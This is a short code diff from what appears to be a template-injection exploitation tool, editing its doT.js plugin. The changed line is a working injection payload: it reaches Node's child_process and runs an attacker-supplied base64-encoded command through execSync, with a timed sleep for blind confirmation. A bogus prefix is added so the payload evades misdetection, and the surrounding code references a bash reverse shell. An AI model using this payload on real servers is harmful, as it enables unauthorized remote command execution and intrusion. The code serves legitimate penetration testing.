@@ -49,8 +49,9 @@ class Dot(Plugin):
             'reverse_shell' : languages.bash_reverse_shell
         },
         'execute_blind' : {
+            # The bogus prefix is to avoid false detection of Javascript instead of doT
             'call': 'inject',
-            'execute_blind': """{{global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');}}"""
+            'execute_blind': """{{=''}}{{global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');}}"""
         },
     }
 
